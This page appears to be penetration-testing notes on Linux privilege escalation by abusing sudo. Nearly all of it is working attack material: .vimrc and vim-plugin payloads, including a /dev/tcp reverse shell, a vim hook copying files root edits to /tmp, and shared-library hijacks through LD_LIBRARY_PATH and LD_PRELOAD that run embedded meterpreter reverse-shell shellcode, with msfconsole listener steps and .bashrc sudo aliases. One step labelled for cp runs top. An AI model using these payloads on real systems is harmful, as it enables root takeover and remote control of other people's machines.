---
title: Linux Privilege Escalation
layout: default
parent: Linux
nav_order: 2
---

## Identifying ##

1. Easiest way is to do the following to see what sudo can do:\
`sudo -l`

## VIM (user need to run as sudo) ##

1. Add the following line to the file .vimrc (or create if don't have):\
`:silent !source ~/.vimrunscript`

2. Next create the file /home/victim/.vimrunscript
```
#!/bin/bash
echo "hacked" > /tmp/hacksrcout.txt
```

3. If user running Ubuntu, Red Hat or similar, no extra steps needed. If running Debian or similar, need to add the following to .bashrc file:\
`alias sudo="sudo -E"`

4. After that run this (if Debian):\
`source ~/.bashrc`

## More obvious way ##
1. Adding to .vimrc file the command you want:\
`!touch /tmp/test.txt`

2. Create a file ending with .vim and following content. Move the file to the following folder ~/.vim/plugin:\
```
:silent !bash -i >& /dev/tcp/IP/PORT 0>&1
```

## VIM keylogger ##
1. This will allow the keylog to only work when the user runs vim as sudo. Add the following content to /home/victim/.vim/plugin/settings.vim:
```
:if $USER == "root"
:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
:endif
```

## LD_LIBRARY_PATH for top##
1. Create a hax.c as below
```
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> // for setuid/setgid

static void runmahpayload() __attribute__((constructor));

int gpgrt_onclose;
int _gpgrt_putc_overflow;
int gpgrt_feof_unlocked;

void runmahpayload() {
	setuid(0);
	setgid(0);
    printf("DLL HIJACKING IN PROGRESS \n");
    system("touch /tmp/haxso.txt");
}
```

2. Create a gpg.map as below
```
GPG_ERROR_1.0 {
gpgrt_ftruncate;
gpgrt_logv;
gpgrt_strdup;
gpgrt_printf_unlocked;
gpgrt_process_ctl;
gpgrt_ftello;
gpg_err_code_to_errno;
gpgrt_log_printhex;
gpgrt_log_bug;
gpgrt_write_hexstring;
gpgrt_b64enc_finish;
gpgrt_b64enc_write;
gpgrt_fileno_unlocked;
gpgrt_set_strusage;
gpgrt_ftell;
gpgrt_argparser;
gpgrt_b64dec_finish;
gpgrt_asprintf;
gpgrt_spawn_actions_set_environ;
gpg_strerror;
gpgrt_lock_init;
gpgrt_log_debug_string;
gpgrt_ftrylockfile;
gpgrt_realloc;
_gpgrt_log_assert;
gpgrt_fopen;
gpgrt_strconcat;
gpgrt_sysopen_nc;
_gpgrt_pending_unlocked;
gpgrt_getline;
gpgrt_vbsprintf;
gpgrt_log_fatal;
gpgrt_fname_get;
gpgrt_fflush;
gpgrt_read;
gpgrt_log_debug;
gpgrt_add_post_log_func;
gpgrt_yield;
gpgrt_log_clock;
gpgrt_spawn_actions_set_atfork;
gpg_err_code_from_errno;
gpgrt_vfprintf_unlocked;
gpgrt_fopencookie;
gpgrt_b64dec_start;
gpgrt_log_get_stream;
gpgrt_inc_errorcount;
gpgrt_sysopen;
gpgrt_write_sanitized;
gpgrt_getenv;
gpgrt_ungetc;
gpgrt_log_get_fd;
gpgrt_ferror_unlocked;
gpgrt_logv_domain;
_gpgrt_get_std_stream;
gpgrt_logv_prefix;
gpgrt_fprintf_sf_unlocked;
gpgrt_get_syscall_clamp;
gpgrt_process_terminate;
gpgrt_clearerr;
gpg_err_init;
gpgrt_vasprintf;
gpgrt_funlockfile;
gpgrt_spawn_actions_release;
gpgrt_free;
gpgrt_log_info;
gpgrt_log_set_sink;
gpgrt_syshd_unlocked;
gpgrt_log_get_prefix;
gpgrt_malloc;
gpg_strerror_r;
gpg_err_deinit;
gpgrt_log;
gpgrt_set_alloc_func;
gpgrt_clearerr_unlocked;
gpgrt_rewind;
gpgrt_set_usage_outfnc;
gpg_strsource;
gpgrt_fprintf_unlocked;
gpgrt_check_version;
gpgrt_fpopen;
gpgrt_ferror;
gpgrt_set_confdir;
gpgrt_fdopen;
gpgrt_fileno;
gpgrt_setbuf;
gpgrt_lock_trylock;
gpgrt_spawn_actions_set_inherit_fds;
gpgrt_freopen;
gpgrt_poll;
gpgrt_fprintf_sf;
gpgrt_add_emergency_cleanup;
gpgrt_b64enc_start;
gpgrt_onclose;
gpgrt_absfnameconcat;
gpgrt_access;
gpgrt_fprintf;
gpgrt_log_set_prefix;
gpgrt_set_nonblock;
gpgrt_fopenmem;
gpgrt_snprintf;
gpgrt_argparse;
gpgrt_log_set_socket_dir_cb;
gpgrt_set_binary;
_gpgrt_getc_underflow;
gpgrt_spawn_actions_new;
gpgrt_opaque_set;
gpgrt_get_errorcount;
gpgrt_fread;
gpgrt_process_get_streams;
gpgrt_log_flush;
gpgrt_flockfile;
gpgrt_chdir;
gpgrt_feof_unlocked;
gpgrt_fputs_unlocked;
_gpgrt_set_std_fd;
gpgrt_usage;
gpgrt_wipememory;
gpgrt_vsnprintf;
_gpgrt_pending;
_gpgrt_putc_overflow;
gpgrt_log_test_fd;
gpgrt_strusage;
gpgrt_spawn_actions_set_redirect;
gpgrt_abort;
gpgrt_fputc;
gpgrt_fseeko;
gpgrt_set_syscall_clamp;
gpgrt_fclose_snatch;
gpgrt_process_get_fds;
gpgrt_process_release;
gpgrt_cmp_version;
gpgrt_fgetc;
gpgrt_log_string;
gpgrt_fwrite;
gpgrt_setenv;
gpgrt_lock_unlock;
gpgrt_write;
gpgrt_getcwd;
gpgrt_calloc;
gpgrt_fclose;
gpgrt_b64dec_proc;
gpgrt_feof;
gpgrt_log_set_pid_suffix_cb;
gpgrt_fnameconcat;
gpgrt_printf;
gpgrt_setvbuf;
gpgrt_lock_lock;
gpgrt_opaque_get;
gpgrt_log_printf;
gpgrt_reallocarray;
gpgrt_fputs;
gpgrt_syshd;
gpgrt_lock_destroy;
gpgrt_set_fixed_string_mapper;
gpgrt_vfprintf;
gpgrt_log_error;
gpgrt_fgets;
gpgrt_fdopen_nc;
gpgrt_fcancel;
gpg_err_code_from_syserror;
gpgrt_process_wait;
gpgrt_mkdir;
gpgrt_read_line;
gpg_err_set_errno;
gpgrt_bsprintf;
gpgrt_fname_set;
gpgrt_tmpfile;
gpgrt_get_nonblock;
gpgrt_fpopen_nc;
gpgrt_process_spawn;
gpgrt_fopenmem_init;
gpgrt_mopen;
gpg_error_check_version;
gpgrt_fseek;
};
```

2. Compile using:
`gcc -Wall -fPIC -c -o hax.o hax.c`

3. Create the shared library:
`gcc -shared -Wl,--version-script gpg.map -o libgpg-error.so.0 hax.o`

4. Edit .bashrc to include the following line:
`alias sudo="sudo LD_LIBRARY_PATH=/home/offsec/ldlib"`

5. Source it:
`source ~/.bashrc`

6. Prepare for shell:
```
msfconsole -q
use multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set lhost IP
set lport PORT
exploit
```

7. If top is run with sudo will result in PE:
`sudo top`


## LD_PRELOAD for cp##
1. Generate msfvenom:
`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT EXITFUNC=thread -f c`

2. Create the following evileuid.c:
```
#define _GNU_SOURCE
#include <sys/mman.h> // for mprotect
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>

char buf[] = 
"\x48\x31\xff\x6a\x09\x58\x99\xb6\x10\x48\x89\xd6\x4d\x31\xc9"
"\x6a\x22\x41\x5a\xb2\x07\x0f\x05\x48\x85\xc0\x78\x51\x6a\x0a"
"\x41\x59\x50\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
"\x48\x85\xc0\x78\x3b\x48\x97\x48\xb9\x02\x00\x05\x39\xc0\xa8"
"\x76\x03\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x59"
"\x48\x85\xc0\x79\x25\x49\xff\xc9\x74\x18\x57\x6a\x23\x58\x6a"
"\x00\x6a\x05\x48\x89\xe7\x48\x31\xf6\x0f\x05\x59\x59\x5f\x48"
"\x85\xc0\x79\xc7\x6a\x3c\x58\x6a\x01\x5f\x0f\x05\x5e\x6a\x7e"
"\x5a\x0f\x05\x48\x85\xc0\x78\xed\xff\xe6";

uid_t geteuid(void)
{
    typeof(geteuid) *old_geteuid;
    old_geteuid = dlsym(RTLD_NEXT, "geteuid");
    if (fork() == 0)
        {
                intptr_t pagesize = sysconf(_SC_PAGESIZE);
                if (mprotect((void *)(((intptr_t)buf) & ~(pagesize - 1)),
                 pagesize, PROT_READ|PROT_EXEC)) {
                        perror("mprotect");
                        return -1;
                }
                int (*ret)() = (int(*)())buf;
                ret();
        }
        else
        {
                printf("HACK: returning from function...\n");
                return (*old_geteuid)();
        }
        printf("HACK: Returning from main...\n");
        return -2;
}
```

3. Add this to .bashrc:
`alias sudo="sudo LD_PRELOAD=/home/offsec/evil_geteuid.so"`

4. Source it:
``source ~/.bashrc``

5. Run the command:
`gcc -Wall -fPIC -z execstack -c -o evil_geteuid.o evileuid.c`

6. Run another command:
`gcc -shared -o evil_geteuid.so evil_geteuid.o -ldl`

7. Prepare for shell:
```
msfconsole -q
use multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set lhost IP
set lport PORT
exploit
```

8. If cp is run with sudo will result in PE:
`sudo top`